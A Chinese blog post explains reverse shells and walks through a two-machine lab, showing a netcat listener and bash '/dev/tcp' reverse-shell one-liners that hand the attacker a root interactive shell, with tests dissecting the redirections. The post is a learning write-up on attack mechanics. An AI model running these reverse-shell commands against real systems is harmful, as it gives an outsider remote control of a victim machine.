+<h2 id="什么是反弹shell？"><a href="#什么是反弹shell？" class="headerlink" title="什么是反弹shell？"></a>什么是反弹shell？</h2><p>反弹shell（reverse shell），就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<p>为什么要反弹shell？</p>
+<p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
+<p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？</p>
+<p>有如下情况：</p>
+<ol>
+<li><p>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
+</li>
+<li><p>目标机器的ip动态改变，你不能持续控制。</p>
+</li>
+<li><p>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
+</li>
+<li><p>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p>
+</li>
+</ol>
+<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/24503813">https://www.zhihu.com/question/24503813</a><br>反弹shell实验</p>
+<p>环境：两台CentOS7.6服务器</p>
+<p>攻击端 hacker：10.201.61.194<br>受害端 victim：10.201.61.195</p>
+<ol>
+<li>攻击端监听一个端口：</li>
+</ol>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@hacker ~]# nc -lvp 6767</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::6767</span><br><span class="line">Ncat: Listening on 0.0.0.0:6767</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>2.受害端生成一个反弹shell：</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">[root@victim ~]# bash -i &gt;&amp; /dev/tcp/10.201.61.194/6767 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">3.攻击端已获取到受害端的bash：</span><br><span class="line"></span><br><span class="line">[root@hacker ~]# nc -lvp 6767</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::6767</span><br><span class="line">Ncat: Listening on 0.0.0.0:6767</span><br><span class="line">Ncat: Connection from 10.201.61.195.</span><br><span class="line">Ncat: Connection from 10.201.61.195:46836.</span><br><span class="line">[root@victim ~]#         //攻击端已获得受害端的远程交互式shell</span><br><span class="line">[root@victim ~]# hostname</span><br><span class="line">hostname</span><br><span class="line">victim</span><br><span class="line">解释：</span><br><span class="line"></span><br><span class="line">1. nc -lvp 6767</span><br><span class="line"></span><br><span class="line">-l 监听，-v 输出交互或出错信息，-p 端口。nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。</span><br><span class="line"></span><br><span class="line">2. bash -i</span><br><span class="line"></span><br><span class="line">-i interactive。即产生一个交互式的shell（bash）。</span><br><span class="line"></span><br><span class="line">3. /dev/tcp/IP/PORT</span><br><span class="line"></span><br><span class="line">特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</span><br><span class="line"></span><br><span class="line">通过以下4个小测试来分析反弹shell实现过程：</span><br><span class="line"></span><br><span class="line">（PS: 注意执行步骤顺序）</span><br><span class="line"></span><br><span class="line">测试1：</span><br><span class="line"></span><br><span class="line">受害端：</span><br><span class="line"></span><br><span class="line">[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566        //第二步</span><br><span class="line">[root@victim ~]# hostname        //第三步</span><br><span class="line">[root@victim ~]#</span><br><span class="line"></span><br><span class="line">攻击端：</span><br><span class="line"></span><br><span class="line">[root@hacker ~]# nc -lvp 5566      //第一步</span><br><span class="line"></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::5566</span><br><span class="line">Ncat: Listening on 0.0.0.0:5566</span><br><span class="line">Ncat: Connection from 10.201.61.195.</span><br><span class="line">Ncat: Connection from 10.201.61.195:49018.</span><br><span class="line"></span><br><span class="line">victim      //测试1结果：实现了将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。</span><br><span class="line">测试2：</span><br><span class="line"></span><br><span class="line">受害端：</span><br><span class="line"></span><br><span class="line">[root@victim ~]# bash -i &lt; /dev/tcp/10.201.61.194/5566        //第二步</span><br><span class="line">[root@victim ~]# hostname        //测试2结果：实现了将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。</span><br><span class="line">victim</span><br><span class="line"></span><br><span class="line"> 攻击端：</span><br><span class="line"></span><br><span class="line">[root@hacker ~]# nc -lvp 5566        //第一步</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::5566</span><br><span class="line">Ncat: Listening on 0.0.0.0:5566</span><br><span class="line">Ncat: Connection from 10.201.61.195.</span><br><span class="line">Ncat: Connection from 10.201.61.195:50412.</span><br><span class="line">hostname        //第三步（攻击端执行命令）</span><br><span class="line">测试3：</span><br><span class="line"></span><br><span class="line">受害端：</span><br><span class="line"></span><br><span class="line">[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1        //第二步</span><br><span class="line">[root@victim ~]# hostname        //受害端回显命令</span><br><span class="line">[root@victim ~]# <span class="built_in">id</span>        //受害端回显命令</span><br><span class="line">[root@victim ~]# hahaha        //受害端回显命令</span><br><span class="line">bash: hahaha: <span class="built_in">command</span> not found        //受害端回显命令。显示错误命令的输出。</span><br><span class="line">[root@victim ~]#</span><br><span class="line"></span><br><span class="line"> 攻击端：</span><br><span class="line"></span><br><span class="line">[root@hacker ~]# nc -lvp 5566        //第一步</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::5566</span><br><span class="line">Ncat: Listening on 0.0.0.0:5566</span><br><span class="line">Ncat: Connection from 10.201.61.195.</span><br><span class="line">Ncat: Connection from 10.201.61.195:36792.</span><br><span class="line">hostname        //第三步（攻击端执行命令）</span><br><span class="line">victim</span><br><span class="line"><span class="built_in">id</span>        //第四步（攻击端执行命令）</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">hahaha        //第五步（执行一个错误的命令）</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>&#x2F;&#x2F;测试3结果：基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。<br>测试4（将上面三个测试结合。将标准输入、标准输出、错误输出全都重定向到攻击端）：</p>
+<p>受害端：</p>
+<p>[root@victim ~]# bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;10.201.61.194&#x2F;5566 0&gt;&amp;1 2&gt;&amp;1        &#x2F;&#x2F;第二步。或 # bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;10.201.61.194&#x2F;5566 0&gt;&amp;1  （注：&amp;&gt;或&gt;&amp; 表示混合输出，即标准输出1 + 错误输出2）</p>
+<p>攻击端：</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@hacker ~]# nc -lvp 5566        //第一步</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::5566</span><br><span class="line">Ncat: Listening on 0.0.0.0:5566</span><br><span class="line">Ncat: Connection from 10.201.61.195.</span><br><span class="line">Ncat: Connection from 10.201.61.195:51182.</span><br><span class="line">[root@victim ~]# hostname        //第三步。测试4结果：攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令~</span><br><span class="line">hostname</span><br><span class="line">victim</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+<p>&#x2F;&#x2F;PS：由测试3、测试4对比可见，标准错误2不仅显示错误信息的作用，居然还有回显输入命令和终端提示符的作用~~~<br>总结：</p>
+<p>本文整理了反弹shell的一些资料并通过实验理解反弹shell原理。深入理解文件描述符和重定向才能更好弄懂反弹shell~</p>
+</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 stackTang 于 2026-06-22 20:48:39 发布</div><div class="post-copyright-link"><span>作品地址：<a href="http://example.com/2026/06/22/shell%E5%8F%8D%E5%BC%B9/">shell反弹</a></span><button class="copy-text" type="button" data-text="http://example.com/2026/06/22/shell%E5%8F%8D%E5%BC%B9/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>stackTang Blog</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"><a class="post-tail-tags-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a><a class="post-tail-tags-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a><a class="post-tail-tags-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></div><div class="post-nav"><a class="post-nav-prev" href="/2026/06/22/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/" title="python沙盒逃逸">上一篇<span>python沙盒逃逸</span></a><a class="post-nav-next" href="/2026/06/22/ruo_yi_3_8/" title="ruo_yi_3_8">下一篇<span>ruo_yi_3_8</span></a></div><div class="comment"><div id="waline"></div></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#707%E6%97%A5%E5%BF%97"><span class="toc-list-text">707日志</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E8%AF%AD%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-list-text">语法总结</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-list-text">文件包含</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">命令执行漏洞</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-list-text">sql注入</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Vagrant%E4%BD%BF%E7%94%A8"><span class="toc-list-text">Vagrant使用</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E6%8C%82%E8%B5%B7%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-list-text">挂起计算机</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93"><span class="toc-list-text">文件头类型总结</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BC%B9shell%EF%BC%9F"><span class="toc-list-text">什么是反弹shell？</span></a></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="http://example.com/2026/06/22/shell%E5%8F%8D%E5%BC%B9/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div class="search-overlay"><div class="search-container"><div class="search-header"><div class="search-title"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg>
+搜索</div><div class="search-close-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 21a9 9 0 0 0 9 -9a9 9 0 0 0 -9 -9a9 9 0 0 0 -9 9a9 9 0 0 0 9 9z" /><path d="M9 8l6 8" /><path d="M15 8l-6 8" /></svg></div></div><div class="search-input-box"><input id="search-input" type="search" placeholder="请输入关键词进行站内搜索……" value="" maxlength="80"/></div><div class="search-result-container"><div class="search-result-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg></div></div></div></div><div id="music-player"></div></main><footer><div class="footer"><div id="footer-copyright">© 2026 <span>💗</span> <a href="/null">stackTang</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.3.2" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2026-07-13T23:13:13.000Z">🌻已稳定运行.年.月.天</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
+  root: '/',
+  toolbar: true,
+  lazyload_src: '/assets/images/Meow-Loading.webp',
+  friends: false,
+  album: '',
+  codeblock: true,
+  code_copy_text: false,
+  share_text: '🐱Share From Meow',
+  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
+  mouse_click: false,
+  notify:{
+    enable: false,
+    info: '复制成功～转载请标注本文地址',
+    f12_info: '开发者模式已打开，请遵循本站版权协议'
+  },
+  search: {
+    enable: true,
+    path: 'search.xml',
+    local: {
+      top_n_per_article: 1,
+      preload: false
+    }
+  },
+  encrypt: false,
+  category: false,
+};
+</script><script>if (!localStorage.getItem('color-mode')) {
+  localStorage.setItem('color-mode', 'light' || 'light');
+}
+document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
+</script>
+<script src="/js/theme/tools/utils.js"></script>
+
+<script src="/js/plugins/dist/lazyload.min.js"></script>
+
+<script src="/js/plugins/view-image.min.js"></script>
+<script>if (localStorage.getItem('font-size')) {
+  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
+}
+</script><script>(() => {
+  let initFn = window.walineFn || null
+
+  const initWaline = (Fn) => {
+    const waline = Fn(Object.assign({
+      el: '#waline',
+      serverURL: 'https://dischat-9perr1k34-tangriweilis-projects.vercel.app',
+      lang: 'zh-CN',
+      dark: 'body[data-mode="dark"]',
+      emoji: null,
+      reaction: null,
+      path: window.location.pathname.replace(/([^\/#]+)(?:#.+|)$/,'$1/'),
+    }, null))
+  }
+
+  const loadWaline = async () => {
+    if (initFn) initWaline(initFn)
+    else {
+      let jsPath = ''
+      if (false) {
+        jsPath = 'dist/waline.js'
+      } else {
+        jsPath = '/js/plugins/dist/waline.js'
+      }
+      const { init } = await import(jsPath)
+      initFn = init || Waline.init
+      initWaline(initFn)
+      window.walineFn = initFn
+    }
+  }
+
+  if (true) {
+    meow.lazyloadFn(document.getElementById('waline'), loadWaline)
+  } else {
+    loadWaline()
+  }
+})()</script>
+<script src="/js/plugins/dist/APlayer.min.js"></script>
+<script>const initAplayer = (data) => {
+  if (!data.length) return;
+
+  const ap = new APlayer({
+    container: document.getElementById('music-player'),
+    fixed: true,
+    autoplay: false,
+    theme: '#FFB347',
+    loop: 'all',
+    order: 'list',
+    volume: 0.7,
+    lrcType: 3,
+    audio: data
+  });
+
+  ap.on('play', () => {
+    document.getElementById('music-player').setAttribute("play", "");
+  });
+  ap.on('pause', () => {
+    document.getElementById('music-player').removeAttribute("play");
+  });
+};
+
+const fetchData = () => {
+  fetch('')
+    .then(res => res.json())
+    .then(result => initAplayer(result));
+};
+
+if ('') {
+  document.addEventListener("DOMContentLoaded", fetchData);
+} else {
+  document.addEventListener("DOMContentLoaded", initAplayer());;
+}</script>
+<script src="/js/plugins/dist/search.js"></script>
+
+<script src="/js/main.js" type="module"></script>
+<script src="https://fastly.jsdelivr.net/npm/live2d-widget@3.1.4/lib/L2Dwidget.min.js"></script><script>(function () {
+  const initLive2D = function () {
+    if (!window.L2Dwidget) return;
+    window.L2Dwidget.init({"model":{"jsonPath":"https://fastly.jsdelivr.net/npm/live2d-widget-model-hijiki@1.0.5/assets/hijiki.model.json","scale":1},"display":{"position":"right","width":150,"height":300,"hOffset":150,"vOffset":-15},"mobile":{"show":true,"scale":0.55},"react":{"opacityDefault":0.88,"opacityOnHover":0.25}});
+  };
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initLive2D, { once: true });
+  } else {
+    initLive2D();
+  }
+})();</script></div></body></html>
